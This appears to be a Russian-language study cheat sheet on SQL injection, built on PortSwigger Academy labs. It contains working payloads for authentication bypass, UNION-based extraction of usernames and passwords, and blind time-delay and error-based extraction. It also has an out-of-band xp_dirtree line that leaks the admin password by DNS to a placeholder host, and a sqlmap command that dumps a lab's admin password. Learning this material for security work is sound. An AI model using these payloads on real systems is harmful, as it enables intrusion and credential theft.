SQL-инъекция - это уязвимость веб-безопасности, позволяющая атакующему изменять запросы, которые приложение отправляет к своей базе данных
## Источники информации
- [SQL injection Learning Path PortSwigger Academy](https://portswigger.net/web-security/learning-paths/sql-injection/)
- [SQLi Cheat Sheet PortSwigger Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadAllTheThings SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
## Инструменты
- [sqlmap](https://github.com/sqlmapproject/sqlmap): `sqlmap -u <url> --data <login=1&password=1>`, `sqlmap -u <url> --cookie='id=1; PHPSESSID=abcdef' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID' --level=2` (SQLi в куки `id`)
## Обнаружение SQLi
- Вставка специальных символов в значение параметров: `'`, `"`, `\`
- Булевы условия: `OR 1=1`, `OR 1=2`
- Полезные нагрузки, осуществляющие временные задержки
- Полезные нагрузки OAST (Out-of-Band Application Security Testing), осуществляющие обращение ко внешним ресурсам
## Места запроса, где возникает SQLi
- Оператор `SELECT`: оператор `WHERE`, оператор `ORDER BY`, имя таблицы, имя столбца
- Оператор `UPDATE`: обновляемые значения, оператор `WHERE
- Оператор `INSERT`: вставляемые значения
## Общая информация
- Внедрение выражения `' or 1=1--` делает следующий SQL-запрос `SELECT <columns> FROM <table_name> WHERE <some_column> = '' or 1=1--`, что приводит к получению значений всех строк из таблицы, так как `1=1` всегда `true`
- Атакующий может обойти аутентификацию, если SQL-запрос в таблицу с пользователями уязвим. Внедрение `--` после значения логина позволит обойти проверку пароля (`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`). Полезные нагрузки для обхода аутентификации: [Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/10d41d2e7de0de20c424c90ceb118a5993110081/SQL%20Injection/Intruder/Auth_Bypass.txt)
- SQLi может быть как в URL параметрах (`https://<url>/filter?Category=<param>`->`SELECT * FROM product WHERE category='<param>')`, так и в куки (`TrackId=<cookie>`-> `SELECT trackId FROM ids where trackId='<cookie>'`)
## Виды
### Union-based
Когда приложение уязвимо для SQL-инъекций и результаты запроса возвращаются в ответах приложения, атакующий может использовать оператор UNION для извлечения данных из других таблиц в базе данных. Пример запроса с оператором UNION: `SELECT a, b FROM table1 UNION SELECT c, d FROM table2` (запрос вернет столбцы `a` и `c` в виде одного столбца, `b` и `d` в виде одного столбца)
#### Условия выполнения Union-based SQLi:
- В объединяемых запросах одинаковое количество столбцов
- Типы данных в соответствующих столбцах должны быть совместимы (значение `NULL` совместимо со всеми типами данных)
#### Определение количества столбцов
- Можно использовать оператор ORDER BY с целью сортировки выходных данных по одному из столбцов. К столбцам можно обращаться по индексам (1, 2, 3, ...). Увеличивая индексы, когда будет сделана попытка отсортировать данные по столбцу, которого не существует,  сервер выдаст ошибку или не выведет данные, что позволит понять, что такого столбца нет. Таким образом, можно узнать количество столбцов в запросе. Пример SQLi: `' ORDER BY <index (1/2/3/...)-->` 
- Количество столбцов можно узнать оператором SELECT и значением NULL, добавляя значения NULL. Когда количество NULL не равно количеству столбцов, сервер будет выводить ошибку или не выдаст ничего. Когда количество NULL будет равно количеству столбцов, приложение выведет дополнительную строку с NULL, либо выведет ошибку NullPointerException. Пример SQLi: `' UNION SELECT NULL(,NULL,NULL,...)--` (в БД Oracle все запросы SELECT должны иметь оператор FROM, поэтому: `' UNION SELECT NULL FROM DUAL--`).
#### Определение типов данных
Определив количество столбцов, необходимо определить типы данных столбцов, которые выводятся веб-приложением. Для этого можно подставлять в запрос со значениями NULL, с помощью которого было определено количество столбцов, значения с интересующим типом данных. Пример SQLi: `' UNION SELECT 'a',NULL,NULL,NULL--` (вместо значения NULL подставлена строка `a`), `' UNION SELECT NULL,'a',NULL,NULL--`. Если тип данных столбца несовместим с типом данных вставленного значения, сервер выдаст ошибку. 
#### Получение информации из БД
Определив количество столбцов и типы данных в столбцах, можно создавать запросы для извлечения информации из БД. Пример SQLi: `' UNION SELECT username, password FROM users--`.
#### Получение нескольких столбцов в одном
В некоторых случаях веб-приложение выводит только один столбец. Чтобы получить данные из нескольких столбцов, можно использовать конкатенацию строк. Пример SQLi для Oracle: `' UNION SELECT username || '~' || password FROM users--`.
#### Получение информации о БД
Атакующий может получить информацию о версии БД, схемах, таблицах, столбцах, которые находятся в БД. Примеры SQLi для PostgreSQL: `' UNION SELECT version()--` (получение версии ПО), `' UNION SELECT * FROM information_schema.tables` (получение информации о таблицах БД).
### Blind
Слепая SQLi (blind SQLi) возникает, когда приложение уязвимо к SQLi, но HTTP-ответы приложения не содержат результаты выполнения SQLi или ошибок БД.
#### Blind SQLi на основе условных ответов
Если атакующий может управлять условием, от выполнения которого зависит ответ приложения (если `true` - один ответ, если `false`- другой ответ), он может реализовать Blind SQLi. Обычно атака реализуется путем перебора всех символов строки, которая интересует атакующего. Если символов содержится в строке на определенном месте, приложение отвечает одним образом. Если не содержится, другим. 
Пример SQLi (условие проверяет, что первый символ пароля администратора - символ `a`) : 
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a
``` 
Пример запроса sqlmap (дамп пароля администратора из таблицы `users` схемы `public` через SQLi в куки `TrackingId`): 
```bash
sqlmap -u 'https://0a6c007e03a064fd8180ac2300c60091.web-security-academy.net/' --cookie='TrackingId=RO861hCz137UK4MN; session=6Wx5XJtrM4qzOZTEMFclYvojlja92S3q' -p 'TrackingId' --param-filter='COOKIE' --skip='session' --level=2 --dbms=postgresql -D public -T users -C password --where="username='administrator'" --dump
``` 
#### Blind SQLi на основе временных задержек
Атакующий может сделать запрос с условием, где в случае выполнения условия (`true`) будет вызываться временная задержка, при невыполнении условия будет задержки не будет. Из-за задержки в БД HTTP-ответ будет возвращаться так же с задержкой. Данная атака работает, если приложение работает синхронно (т.е.HTTP-ответ приходит после выполнения SQL-запроса).
Примеры SQLi для MS SQL Server:
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
```
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
```sql
`'; IF (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, 1, 1) = 'a') = 1 WAITFOR DELAY '0:0:10'--`
```
#### Blind SQLi с помощью OAST (Out-of-Band Application Security Testing)
Если приложение работает асинхронно (временные задержки невозможно эксплуатировать), атакующий может заставить БД обращаться ко внешним ресурсам с целью получения информации. Наиболее часто для этого используется протокол DNS. 
Пример SQLi для MS SQL Server (БД отправляет DNS-запрос):
```sql
`'; exec master..xp_dirtree '//<site.com>/a'--`
```
Такие запросы атакующий может использовать для получения данных из БД. 
Пример SQLi для MS SQL Server (БД отправляет DNS-запрос и добавляет данные из БД в качестве поддомена):
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.<site.com>/a"')--
```
### Error-based
SQLi на основе ошибок (error-based) возникает, когда атакующий может использовать сообщения об ошибках для получения конфиденциальных данных из БД.
#### Error-based SQLi на основе условных ошибок
Атакующий может отправлять SQL-запрос, который вызовет ошибку БД при выполнении условия. Часто приложение ведет себя иначе при появлении необработанной ошибки БД, что будет указывать на истинность условия. 
Запросы для проверки наличия Error-based SQLi (первый запрос - нет ошибки, второй запрос - ошибка):
```sql
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Пример SQLi для Oracle (если первый символ пароля администратора равен `a`, то условие будет ошибка (`1/0`), иначе условие будет верным (`A=A`): 
```sql
' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'A' END FROM dual)='A;
```
#### Error-based SQLi на основе сообщений ошибок
Некоторые ошибки БД могут выводить данные. 
Примеры SQLi для PostgreSQL (получение первого значения из колонки `password` таблицы `users`): 
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```
```sql
' AND 1=(SELECT password FROM users LIMIT 1)::int--
```